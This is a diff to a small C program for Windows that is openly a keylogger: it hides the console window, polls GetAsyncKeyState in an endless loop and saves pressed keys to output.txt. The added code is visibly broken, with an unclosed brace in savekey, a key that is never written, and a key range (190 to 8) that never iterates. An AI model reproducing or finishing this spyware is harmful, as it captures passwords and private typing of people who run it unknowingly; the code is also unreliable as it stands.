@@ -1,19 +1,31 @@
 #include <getopt.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
+#include <Windows.h>
 #include <winuser.h>
 #include <unistd.h>
 
-#define CLN_OPT  "rm -f output.txt"
-#define CONS_WIN "ConsoleWindowClass"
-#define OPT_FILE "output.txt"
-#define OPT_STR  "lr"
+#define CLN_OPT      "rm -f output.txt"
+#define CONS_WIN     "ConsoleWindowClass"
+#define MAX_KEY      8
+#define MIN_KEY      190
+#define MLSB_PRESSED -32767
+#define OPT_FILE     "output.txt"
+#define OPT_STR      "lr"
 
 // prints error message and exits the program.
 void errexit (const char *errmsg) {
   printf ("%s\n", errmsg);
   exit (EXIT_FAILURE);
+}
+
+// saves a key to the output file.
+void savekey (const char key) {
+  FILE *lptr = fopen (OPT_FILE, "a");
+  if (lptr == NULL) {
+    errexit ("Error Creating Output File.");
+  if (key == 1 || key == 2) { return ; }
+  
 }
 
 // opens the last record of .output in less.
@@ -45,17 +57,11 @@ void lopen () {
 
 // records new keystrokes.
 void rmode () {
-  FILE *lptr = NULL;
   HWND window = NULL;
   char c;
   
   // cleans the last record of .output so that new keystrokes can be logged.
   system (CLN_OPT);
-  
-  // initializing lptr (the log where keystrokes are stored).
-  if ((lptr = fopen (OPT_FILE, "w")) == NULL) {
-    errexit ("Error Opening File.");
-  }
   
   // allocating new window for keylogging.
   AllocConsole();
@@ -67,7 +73,16 @@ void rmode () {
   
   // keylogging.
   while (true) {
-    
+    for (c = MIN_KEY; c <= MAX_KEY; c++) {
+      // GetAsyncKeyState sets the MSB and LSB when a key has been pressed.
+      if (GetAsyncKeyState (c) == MLSB_PRESSED) {
+        // save the key.
+        savekey (c);
+      }
+    }
+  }
+  
+  // program finishes when user enters ctrl+c.
 }
 
 // main method: parses the command line arguments and takes appropriate action
